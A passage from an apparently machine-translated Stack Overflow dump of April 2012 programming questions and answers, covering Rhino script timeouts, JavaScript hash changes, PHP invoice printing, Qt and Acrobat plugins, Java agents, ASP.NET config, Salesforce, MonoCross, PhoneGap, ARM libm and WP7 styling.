        ScriptableObject scope = cx.initStandardObjects();

        // your code here

    } catch (Error e) {
        System.out.println("execution was aborted: " + e.getMessage());
    } finally {
        Context.exit();
    } 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-04-20T12:33:49.537

Rhino 引擎[似乎没有](http://www.jarvana.com/jarvana/view/org/mozilla/rhino/1.7R3/rhino-1.7R3-javadoc.jar!/index.html)任何机制来执行此操作（坏 Rhino！）并且很难判断它是否在内部创建线程，因此您唯一的解决方案是创建一个[`ThreadGroup`](http://docs.oracle.com/javase/6/docs/api/java/lang/ThreadGroup.html)，加载并执行 Rhino 引擎和它的脚本来自该组中的一个线程，当你想杀死它时，使用[`ThreadGroup.stop()`](http://docs.oracle.com/javase/6/docs/api/java/lang/ThreadGroup.html#stop%28%29). 是的，它已被弃用，但考虑到 Rhino 图书馆方面没有合作，确实没有其他方法可以做到这一点。

# javascript - 等待 url 在点击事件上改变

> ID：10246033
> 
> 赞同：3
> 
> 时间：2012-04-20T12:13:28.537
> 
> 标签：javascript, jquery, window.location

我有一张图片，点击图片后，URL 会发生变化，但页面没有重新加载（部分导航）。我已经使用`window.location.href`它来获取当前 URL，但它会在控制台日志上显示以前的 URL。我想在 URL 更改后获取它。

我错过了一些窗口等待事件吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T12:22:58.197

要检索页面的新哈希，请使用[location.hash](https://developer.mozilla.org/En/DOM/Window.location)：

```
var hash = window.location.hash; 
```

对于过去的类似要求，我使用了[Ben Alman 的 hashChange 插件](http://benalman.com/projects/jquery-hashchange-plugin/)。将插件包含在页面上后，您可以将代码附加到`hashChange`事件：

```
$(window).hashchange( function(){
    // Your code here
}) 
```

这是[一个要演示的工作小提琴](http://jsfiddle.net/4nVxA/)。

**附加信息**

这篇 SO 帖子值得一读：[On - window.location.hash - change?](https://stackoverflow.com/questions/680785/on-window-location-hash-change)

**笔记**

如果您不想使用插件，则必须先发布您的标记，然后我才能提供替代解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:33:13.160

```
var hash = window.location.hash;
var loc = window.location.href+hash;
window.location=loc; 
```

# php - 将 HTML 表格转换为文本文件而不丢失格式

> ID：10246038
> 
> 赞同：0
> 
> 时间：2012-04-20T12:13:41.993
> 
> 标签：php, html, text, printing, dot-matrix

我找不到任何可以回答我的问题的帖子。

我有一个带有表格的 html 文件，需要将其转换为文本文件而不会丢失使用 php 脚本的格式，因为它必须按原样在点阵打印机上打印。

或者，如果有任何其他方式可以做到这一点，请建议！

该表是发票格式，请参见下文：

```
<table width='100' height='300' border='0' cellspacing='0' cellpadding='1'>  <tr>    <td><img src='spacer.jpg' width='100' height='1'></td>    <td><table width='840' border='1' cellspacing='2' cellpadding='0'><tr><td width='660' colspan='2' valign='top'><br><br><br><br><br><br><br><br><br>Customer Name: 3M India Ltd<br>
    Address:Plat 48-51 Electronic City<br><br></td><td width='180' valign='top'><br><br><br><br><br><br><br><br><br>
Inv No: 78788<br><br>Date:&nbsp;&nbsp;&nbsp;20/04/2012&nbsp;12:28:18<br><br> 
</td>  </tr>  <tr>    <td width='292' valign='top'>DC Nos: 500,&nbsp;    <br><br></td><td valign='top'> Your Order No.: 322<br>
       C.E.Reg No.: <br>
       Vehicle No.: KA-01-N-2345<br><td valign='top'> Party:<br>
TIN: 29400127541<br>
CST: 29400127541<br></td>  </tr>  <tr>    <td colspan='2'>Sl No. &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Description &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tariff Code &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rate &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Qty </td>    <td>Amount</td>  </tr>  <tr>    <td colspan='3'>     <table width='840' height='160' border='0' cellspacing='1' cellpadding='0'>     <tr valign='top'>       <td width='87'>1</td>       <td width='247'>Argon</td>      <td width='165'>AR1223</td>     <td width='92'>120</td>     <td width='67'>1&nbsp;Nos</td>      <td width='182'>120.00</td>     </tr>       </table>    </td>  </tr>  <tr> <td colspan='2' valign='top'><div align='right'><br>VAT: &nbsp;5.00 %<br>Demurrage: <br>   Freight:  <br><br>    </div>Rupees Four Hundred & Fourty One    Only.</td><td valign='top'><br> 21.00<br> 0.00<br> 300.00<br><br> </td>  </tr>  <tr>    <td colspan='2' valign='top'><div align='right'>Total:<br><br>Rounded Off</div></td>    <td valign='top'>441.00<br><br>441.00<br><br></td>  </tr></table>    </td>  </tr></table> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T15:07:55.597

您不能在 Microsoft Word 中打开 HTML 文件，然后将其发送打印吗？

您还可以将 HTML 文件转换为 PDF，有几个免费的（谷歌“html 到 pdf 转换”）作为另一个选项来查看它是否有效。

# qt - 即使使用 qt_mac_set_native_menubar(false) 在插件中使用 QApplication 时，应用程序菜单也会消失

> ID：10246040
> 
> 赞同：0
> 
> 时间：2012-04-20T12:13:45.970
> 
> 标签：qt, plugins, acrobat

我正在使用一个使用 Qt Widgets 的 Acrobat 插件（SDK Acrobat 8​​）。它适用于 Qt 4.3.4。升级到 Qt 4.6.4 Carbon 后，如果实例化了 QApplication，则不再可能看到 Acrobat 的菜单。

```
int argc = 0;
(void)new QApplication(argc, 0, true);

qt_mac_set_native_menubar(false); 
```

使用这 3 行，Acrobat 菜单不会加载，也无法退出，只能强制退出。没有警告消息，一切似乎都运行良好，但实际上并非如此。如果没有这 3 行，只要不创建小部件，acrobat 就可以正常工作（请参阅 QApplication 文档）。

为什么？感谢您提供的任何信息

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:11:20.503

尝试

```
qApp->setAttribute(Qt::AA_MacPluginApplication,true); 
```

在您创建`QApplication`.

# java - 使用 java 代理时出错

> ID：10246041
> 
> 赞同：2
> 
> 时间：2012-04-20T12:13:46.450
> 
> 标签：java, profiler, javaagents

我尝试使用[http://www.ibm.com/developerworks/java/library/j-jip/构建分析器](http://www.ibm.com/developerworks/java/library/j-jip/)

在命令提示符下执行时我的一个 java 应用程序

```
java -jar abc.jar 
```

提供所需的输出，但是当使用 javaagent 分析相同的应用程序时会出现错误

```
java -javaagent:profiler.jar -jar abc.jar 
```

给出以下错误

```
Exception in thread "main" java.lang.VerifyError: Expecting a stackmap frame at
branch target 20 in method 
()V at offset 12
        at java.lang.Class.getDeclaredMethods0(Native Method)
        at java.lang.Class.privateGetDeclaredMethods(Unknown Source)
        at java.lang.Class.getMethod0(Unknown Source)
        at java.lang.Class.getMethod(Unknown Source)
        at sun.launcher.LauncherHelper.getMainMethod(Unknown Source)
        at sun.launcher.LauncherHelper.checkAndLoadMain(Unknown Source) 
```

但是也有一些使用上述 javaagent 方法运行良好的 Swing 应用程序。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-23T13:40:56.310

你确定你在JDK6上运行你的目标JVM吗？JDK 7 加强了对堆栈映射帧执行的检查，当字节码被不知道这些更改的工具修改时，这可能导致此类 VerifyError 异常。

仔细检查目标 JVM，如果您发现您使用的是 JDK 7，您可以切换到 JDK 6 或使用“-XX:-UseSplitVerifier”开关将验证程序更改回 JDK 6 版本。

# vb.net - ASP.net Web 服务器未登录

> ID：10246042
> 
> 赞同：0
> 
> 时间：2012-04-20T12:13:56.013
> 
> 标签：vb.net, visual-studio-2008, login, web-config

我继承了一个 ASP.net 站点，并对一些 VB 代码和 CSS 进行了一些更改，并将其托管在 FTP 上。它使用 SQL DB 允许用户登录和调用存储过程。

该站点没有错误，并允许我以用户身份登录，并且可以在测试中完美运行。

但是，一旦上传到 FTP，它就不再允许我以用户身份登录。它挂了一会儿，然后返回一条消息，说密码错误，尽管它是正确的。它不会引发错误消息，我认为我已经将其范围缩小到与 Web.config 文件有关的内容，但我不知道它是如何不起作用的，尤其是在缺少错误消息的情况下抛出。

有任何想法吗？

```
<?xml version="1.0"?> 
```

```
 Visual Basic options:
        Set strict="true" to disallow all data type conversions 
        where data loss can occur. 
        Set explicit="true" to force declaration of all variables.
    -->
    <compilation debug="true" strict="false" explicit="true">
        <assemblies>
            <add assembly="System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
            <add assembly="System.Data.DataSetExtensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
            <add assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
            <add assembly="System.Xml.Linq, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
        </assemblies>
</compilation>
    <pages>
        <namespaces>
            <clear/>
            <add namespace="System"/>
            <add namespace="System.Collections"/>
            <add namespace="System.Collections.Generic"/>
            <add namespace="System.Collections.Specialized"/>
            <add namespace="System.Configuration"/>
            <add namespace="System.Text"/>
            <add namespace="System.Text.RegularExpressions"/>
            <add namespace="System.Linq"/>
            <add namespace="System.Xml.Linq"/>
            <add namespace="System.Web"/>
            <add namespace="System.Web.Caching"/>
            <add namespace="System.Web.SessionState"/>
            <add namespace="System.Web.Security"/>
            <add namespace="System.Web.Profile"/>
            <add namespace="System.Web.UI"/>
            <add namespace="System.Web.UI.WebControls"/>
            <add namespace="System.Web.UI.WebControls.WebParts"/>
            <add namespace="System.Web.UI.HtmlControls"/>
        </namespaces>
        <controls>
            <add tagPrefix="asp" namespace="System.Web.UI" assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
            <add tagPrefix="asp" namespace="System.Web.UI.WebControls" assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
        </controls>
    </pages>
    <!--
        The <authentication> section enables configuration 
        of the security authentication mode used by 
        ASP.NET to identify an incoming user. 
    -->
    <authentication mode="Windows"/>
    <!--
        The <customErrors> section enables configuration 
        of what to do if/when an unhandled error occurs 
        during the execution of a request. Specifically, 
        it enables developers to configure html error pages 
        to be displayed in place of a error stack trace.

    <customErrors mode="RemoteOnly" defaultRedirect="GenericErrorPage.htm">
        <error statusCode="403" redirect="NoAccess.htm" />
        <error statusCode="404" redirect="FileNotFound.htm" />
    </customErrors>
    -->
    <httpHandlers>
        <remove verb="*" path="*.asmx"/>
        <add verb="*" path="*.asmx" validate="false" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
        <add verb="*" path="*_AppService.axd" validate="false" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
        <add verb="GET,HEAD" path="ScriptResource.axd" type="System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" validate="false"/>
    </httpHandlers>
    <httpModules>
        <add name="ScriptModule" type="System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
    </httpModules>
</system.web>
<system.codedom>
    <compilers>
        <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" warningLevel="4" type="Microsoft.VisualBasic.VBCodeProvider, System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
            <providerOption name="CompilerVersion" value="v3.5"/>
            <providerOption name="OptionInfer" value="true"/>
            <providerOption name="WarnAsError" value="false"/>
        </compiler>
    </compilers>
</system.codedom>
<!-- 
    The system.webServer section is required for running ASP.NET AJAX under Internet
    Information Services 7.0\.  It is not necessary for previous version of IIS.
-->
<system.webServer>
    <validation validateIntegratedModeConfiguration="false"/>
    <modules>
        <remove name="ScriptModule"/>
        <add name="ScriptModule" preCondition="managedHandler" type="System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
    </modules>
    <handlers>
        <remove name="WebServiceHandlerFactory-Integrated"/>
        <remove name="ScriptHandlerFactory"/>
        <remove name="ScriptHandlerFactoryAppServices"/>
        <remove name="ScriptResource"/>
        <add name="ScriptHandlerFactory" verb="*" path="*.asmx" preCondition="integratedMode" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
        <add name="ScriptHandlerFactoryAppServices" verb="*" path="*_AppService.axd" preCondition="integratedMode" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
        <add name="ScriptResource" preCondition="integratedMode" verb="GET,HEAD" path="ScriptResource.axd" type="System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
    </handlers>
</system.webServer>
<runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
        <dependentAssembly>
            <assemblyIdentity name="System.Web.Extensions" publicKeyToken="31bf3856ad364e35"/>
            <bindingRedirect oldVersion="1.0.0.0-1.1.0.0" newVersion="3.5.0.0"/>
        </dependentAssembly>
        <dependentAssembly>
            <assemblyIdentity name="System.Web.Extensions.Design" publicKeyToken="31bf3856ad364e35"/>
            <bindingRedirect oldVersion="1.0.0.0-1.1.0.0" newVersion="3.5.0.0"/>
        </dependentAssembly>
    </assemblyBinding>
</runtime> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T12:51:59.443

我认为它可能是 IIS 中的配置（假设它是托管的）。我会查看您对该网站的身份验证设置

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T15:29:47.073

从那以后我在其他地方托管，这似乎已经成功了，所以我认为问题出在主机的配置上。

# salesforce - 在相关对象字段中将机会金额字段值设置为默认值

> ID：10246043
> 
> 赞同：0
> 
> 时间：2012-04-20T12:13:57.703
> 
> 标签：salesforce

我有一个自定义对象**FlightRequest**用于**Opportunity**对象，并且在**Opportunity**和**FlightRequest中都有一个****Amount**文件。

 ****我想在**FlightRequest**的**Amount字段中将****Opportunity**的**Amount**字段值设置为默认值。因此，每当单击**FlightRequest的****New Button**时，**Amount**输入应该已经包含**Opportunity**的**Amount**

 ******我正在使用**标准页面布局**而不是任何视觉强制页面布局，并且不能使用它。

我看到有一个选项可以为字段设置默认值，但**选择字段类型**选项中未显示机会对象

请建议我怎么能做到这一点

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-21T19:53:47.120

This is possible with a "unofficially" supported technique (meaning everyone has been doing it for 10 yrs and while they say it's unsupported they'll never break it, too many customers use it) called URL hacking. Basically when they click the new button you'll pass the value for your field into the new record page dynamically based on the parent record. There is a good [blog post tutorial](http://www.interactiveties.com/b_pass_vars_url.php) on this. Give it a try and that should do what you need.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T13:27:49.863

您需要在对象之间建立主从关系，然后您可以将 FlightRequest 对象上的 Amount 字段设置为引用 Opportunity 上的 Amount 字段的公式字段。

这应该完成您需要做的事情。Master-Detail 关系对于字段的跨对象引用是必不可少的。**********

# monodevelop - 在 Monodevelop for Mac 上安装 Monocross 框架

> ID：10246051
> 
> 赞同：3
> 
> 时间：2012-04-20T12:14:30.123
> 
> 标签：monodevelop, monocross

我正在尝试在 Monodevelop for Mac 上安装 Monocross 框架。步骤应该是： 1\. 启动 MonoDevelop。2\. 在 MonoDevelop 中，选择工具 >> 插件管理器并选择图库选项卡。3\. 选择 Mac OS 的 MonoCross MonoDevelop Templates 安装包。

但是没有“MonoCross MonoDevelop Templates”选项。

一些帮助，请？

干杯！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-30T10:07:22.200

为 MonoDevelop 安装 MonoCross 模板

1.  将 Templates.zip 存档解压缩到 Mac 上的某个位置；存档包含两个文件：

MonoDevelop.MonoCross_MD28.Templates_0.9.mpack - MonoDevelop 2.8 的模板 MonoDevelop.MonoCross.Templates_0.9.mpack - MonoDevelop 3.0 的模板

1.  打开 MonoDevelop，然后单击 MonoDevelop 菜单。
2.  从 MonoDevelop 菜单中选择加载项管理器...。
3.  在加载项管理器对话框中，单击从文件安装...</li>
4.  导航到您解压缩模板存档的位置，然后为您的 MonoDevelop 版本选择 .mpack 包。
5.  单击打开，然后安装...以安装模板；MonoCross 模板应该出现在插件管理器对话框的左侧窗格中。
6.  单击关闭。

现在你应该在你的新解决方案上看到一个 MonoCross 选项…和你的文件菜单上的新文件…选项。您可以使用这些模板来构建 MonoCross 项目。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-01T08:23:01.147

为 MonoDevelop 安装 MonoCross 模板

将 Templates.zip 存档解压缩到 Mac 上的某个位置；存档包含两个文件： MonoDevelop.MonoCross_MD28.Templates_0.9.mpack - MonoDevelop 2.8 的模板 MonoDevelop.MonoCross.Templates_0.9.mpack - MonoDevelop 3.0 的模板

1.  打开 MonoDevelop，然后单击 MonoDevelop 菜单。
2.  从 MonoDevelop 菜单中选择加载项管理器...。
3.  在加载项管理器对话框中，单击从文件安装...</li>
4.  导航到您解压缩模板存档的位置，然后为您的 MonoDevelop 版本选择 .mpack 包。
5.  单击打开，然后安装...以安装模板；MonoCross 模板应该出现在插件管理器对话框的左侧窗格中。
6.  单击关闭。

现在你应该在你的新解决方案上看到一个 MonoCross 选项…和你的文件菜单上的新文件…选项。您可以使用这些模板来构建 MonoCross 项目。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T14:23:28.750

我也找不到这个（我查看了包含该章节的书的演示，它并没有比你所说的更多）。

[所以我四处搜索，在谷歌代码](http://code.google.com/p/monocross/source/checkout)上找到了 monocross 的代码 ，并使用 svn 检查了树干。

通过在我的 MBP 上打开 Monodevelop 应用程序内容，我了解到他们只完成了 android 方面的模板（！）。

之后剩下的就是复制

***主干/MonoCross.Templates.MonoDevelop/MonoDevelop.MonoCross***

subdir 及其所有内容放入 mac 应用程序包中

***目录/MacOS/lib/monodevelop/Addins***

并重新启动 MonoDevelop。

之后，您可以在 C# 部分下看到带有（仅）Android 模板的 Monocross 类别。

我希望这会有所帮助并引起人们注意他们还没有...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T03:39:49.777

您指的是很少的旧文档。

如果您从 www.monocross.net 下载最新的模板并阅读自述文件，您会发现以下说明非常容易解释。

为 MonoDevelop 安装 MonoCross 模板

1.  将 Templates.zip 存档解压缩到 Mac 上的某个位置；存档包含两个文件：

MonoDevelop.MonoCross_MD28.Templates_0.9.mpack - MonoDevelop 2.8 的模板 MonoDevelop.MonoCross.Templates_0.9.mpack - MonoDevelop 3.0 的模板

1.  打开 MonoDevelop，然后单击 MonoDevelop 菜单。
2.  从 MonoDevelop 菜单中选择加载项管理器...。
3.  在加载项管理器对话框中，单击从文件安装...</li>
4.  导航到您解压缩模板存档的位置，然后为您的 MonoDevelop 版本选择 .mpack 包。
5.  单击打开，然后安装...以安装模板；MonoCross 模板应该出现在插件管理器对话框的左侧窗格中。
6.  单击关闭。

现在你应该在你的新解决方案上看到一个 MonoCross 选项…和你的文件菜单上的新文件…选项。您可以使用这些模板来构建 MonoCross 项目。

# javascript - 在 webview 中打开外部网站

> ID：10246056
> 
> 赞同：1
> 
> 时间：2012-04-20T12:14:54.157
> 
> 标签：javascript, android, cordova

如何在 phonegap 使用的 webview 中打开外部网站。如果我正在使用

```
window.location.href = "www.example.com" 
```

它将打开浏览器并加载网站。

我找到了[https://github.com/phonegap/phonegap-plugins/tree/master/Android/ChildBrowser](https://github.com/phonegap/phonegap-plugins/tree/master/Android/ChildBrowser)但这将打开该网站的模式。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:35:55.130

在你`PhoneGap.plist`的键下添加`ExternalHosts`：`*.example.com`. 它实际上是一个白名单，以防止您的应用程序转到未经授权的 url，否则它将在类似于沙盒环境的 webbrowser 中打开。

无论如何，我认为它不会起作用，如果您通过转到其他 url 离开 PhoneGap 结构，除了白名单之外，您还应该使用 iframe 来处理外部链接。

编辑：对于 Android，打开您的 config.xml 文件并添加以下内容：

*   允许访问每个域：`<access origin="*" />`
*   到特定域：`<access origin="http://phonegap.com" subdomains="true" />`

您还可以查看此[文件](https://build.phonegap.com/docs/config-xml)的文档。

# math - 为 ARM 优化的 Libm？

> ID：10246062
> 
> 赞同：5
> 
> 时间：2012-04-20T12:15:08.017
> 
> 标签：math, arm, libm

**是否有针对 ARM(v6) 处理器优化的 libm (libmath)？**

我正在查看 GNU 实现，它似乎没有经过优化（但它确实有 x86 的）。似乎大多数 libm 实现都没有针对 ARM 的优化。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-10T01:29:58.827

我发现的最接近的选项是在 AOSP Android 的存储库中使用 libm for ARM（或者制造商，如果他们为您的 cpu 提供优化的 android 版本）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-20T23:38:44.183

官方 ARM 库提供了许多数学库。取决于你有什么应用程序。 [https://developer.arm.com/solutions/hpc/hpc-software/categories/math-libraries](https://developer.arm.com/solutions/hpc/hpc-software/categories/math-libraries)

# php - 如何设置所见即所得文本的字体大小

> ID：10246064
> 
> 赞同：0
> 
> 时间：2012-04-20T12:15:17.467
> 
> 标签：php, joomla, fonts, wysiwyg

文本提交后存入数据库，然后我拿到并放到页面上，但问题是字体的大小可以很大，也可以很大。但是我需要将字体大小设置为相等，而不是取决于所见即所得中使用的字体大小，但我不明白为什么字体大小没有改变？

例如我有这个：

```
<div style="font-size: 10pt">
<p>
BIG TEXT    
</p>
</div> 
```

- 是所见即所得的`<P>`文本，我的风格不起作用，我也尝试设置！重要 - 也不起作用，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:22:30.150

我认为您不应该将`font-size`声明添加`<div>`到`<p>`标签中。另一种选择是将一段 css 添加到页面的标题中，如下所示：

```
<head>
    <style>
        p {
            size: 10px;
        }
    </style>
</head> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:42:25.380

如果你这样使用....在 p 标签中使用的任何单词都是字体大小为 10 ...

```
 <div>
<p style="size='10px'";>
BIG TEXT    
</p> 
```

# windows-phone-7 - WP7 - 更改多选列表复选框颜色

> ID：10246067
> 
> 赞同：1
> 
> 时间：2012-04-20T12:15:40.537
> 
> 标签：windows-phone-7, themes, multi-select

我的应用程序使用覆盖手机主题颜色的黑色背景。

将主题颜色设置为白色时，复选框控件变为黑色，这意味着在黑色背景上看不到它们。

如何将多选列表项复选框的背景颜色更改为白色？

干杯，

卡梅伦

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T05:58:08.847

```
<ResourceDictionary
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml">
<Style x:Key="PhoneButtonBase" TargetType="ButtonBase">
    <Setter Property="Background" Value="Transparent"/>
    <Setter Property="BorderBrush" Value="{StaticResource PhoneForegroundBrush}"/>
    <Setter Property="Foreground" Value="{StaticResource PhoneForegroundBrush}"/>
    <Setter Property="BorderThickness" Value="{StaticResource PhoneBorderThickness}"/>
    <Setter Property="FontFamily" Value="{StaticResource PhoneFontFamilySemiBold}"/>
    <Setter Property="FontSize" Value="{StaticResource PhoneFontSizeMediumLarge}"/>
    <Setter Property="Padding" Value="10,3,10,5"/>
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="ButtonBase">
                <Grid Background="Transparent">
                    <VisualStateManager.VisualStateGroups>
                        <VisualStateGroup x:Name="CommonStates">
                            <VisualState x:Name="Normal"/>
                            <VisualState x:Name="MouseOver"/>
                            <VisualState x:Name="Pressed">
                                <Storyboard>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Foreground" Storyboard.TargetName="ContentContainer">
                                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PhoneBackgroundBrush}"/>
                                    </ObjectAnimationUsingKeyFrames>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Background" Storyboard.TargetName="ButtonBackground">
                                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PhoneForegroundBrush}"/>
                                    </ObjectAnimationUsingKeyFrames>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="BorderBrush" Storyboard.TargetName="ButtonBackground">
                                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PhoneForegroundBrush}"/>
                                    </ObjectAnimationUsingKeyFrames>
                                </Storyboard>
                            </VisualState>
                            <VisualState x:Name="Disabled">
                                <Storyboard>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Foreground" Storyboard.TargetName="ContentContainer">
                                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PhoneDisabledBrush}"/>
                                    </ObjectAnimationUsingKeyFrames>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="BorderBrush" Storyboard.TargetName="ButtonBackground">
                                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PhoneDisabledBrush}"/>
                                    </ObjectAnimationUsingKeyFrames>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Background" Storyboard.TargetName="ButtonBackground">
                                        <DiscreteObjectKeyFrame KeyTime="0" Value="Transparent"/>
                                    </ObjectAnimationUsingKeyFrames>
                                </Storyboard>
                            </VisualState>
                        </VisualStateGroup>
                    </VisualStateManager.VisualStateGroups>
                    <Border x:Name="ButtonBackground" BorderBrush="{TemplateBinding BorderBrush}" BorderThickness="{TemplateBinding BorderThickness}" Background="{TemplateBinding Background}" CornerRadius="0" Margin="{StaticResource PhoneTouchTargetOverhang}">
                        <ContentControl x:Name="ContentContainer" ContentTemplate="{TemplateBinding ContentTemplate}" Content="{TemplateBinding Content}" Foreground="{TemplateBinding Foreground}" HorizontalContentAlignment="{TemplateBinding HorizontalContentAlignment}" Padding="{TemplateBinding Padding}" VerticalContentAlignment="{TemplateBinding VerticalContentAlignment}"/>
                    </Border>
                </Grid>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style>
<Style x:Key="PhoneRadioButtonCheckBoxBase" BasedOn="{StaticResource PhoneButtonBase}" TargetType="ToggleButton">
    <Setter Property="Background" Value="{StaticResource PhoneRadioCheckBoxBrush}"/>
    <Setter Property="BorderBrush" Value="{StaticResource PhoneRadioCheckBoxBrush}"/>
    <Setter Property="FontSize" Value="{StaticResource PhoneFontSizeMedium}"/>
    <Setter Property="FontFamily" Value="{StaticResource PhoneFontFamilyNormal}"/>
    <Setter Property="HorizontalContentAlignment" Value="Left"/>
    <Setter Property="VerticalContentAlignment" Value="Center"/>
    <Setter Property="Padding" Value="0"/>
</Style>
<Style BasedOn="{StaticResource PhoneRadioButtonCheckBoxBase}" TargetType="CheckBox">
    <Setter Property="Template">
        <Setter.Value>
            <ControlTemplate TargetType="CheckBox">
                <Grid Background="Transparent">
                    <VisualStateManager.VisualStateGroups>
                        <VisualStateGroup x:Name="CommonStates">
                            <VisualState x:Name="Normal"/>
                            <VisualState x:Name="MouseOver"/>
                            <VisualState x:Name="Pressed">
                                <Storyboard>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Fill" Storyboard.TargetName="CheckMark">
                                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PhoneRadioCheckBoxCheckBrush}"/>
                                    </ObjectAnimationUsingKeyFrames>
                                </Storyboard>
                            </VisualState>
                            <VisualState x:Name="Disabled">
                                <Storyboard>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Fill" Storyboard.TargetName="CheckMark">
                                        <DiscreteObjectKeyFrame KeyTime="0" Value="{StaticResource PhoneRadioCheckBoxCheckDisabledBrush}"/>
                                    </ObjectAnimationUsingKeyFrames>
                                </Storyboard>
                            </VisualState>
                        </VisualStateGroup>
                        <VisualStateGroup x:Name="CheckStates">
                            <VisualState x:Name="Checked">
                                <Storyboard>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Visibility" Storyboard.TargetName="CheckMark">
                                        <DiscreteObjectKeyFrame KeyTime="0">
                                            <DiscreteObjectKeyFrame.Value>
                                                <Visibility>Visible</Visibility>
                                            </DiscreteObjectKeyFrame.Value>
                                        </DiscreteObjectKeyFrame>
                                    </ObjectAnimationUsingKeyFrames>
                                </Storyboard>
                            </VisualState>
                            <VisualState x:Name="Unchecked"/>
                            <VisualState x:Name="Indeterminate">
                                <Storyboard>
                                    <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="Visibility" Storyboard.TargetName="IndeterminateMark">
                                        <DiscreteObjectKeyFrame KeyTime="0">
                                            <DiscreteObjectKeyFrame.Value>
                                                <Visibility>Visible</Visibility>
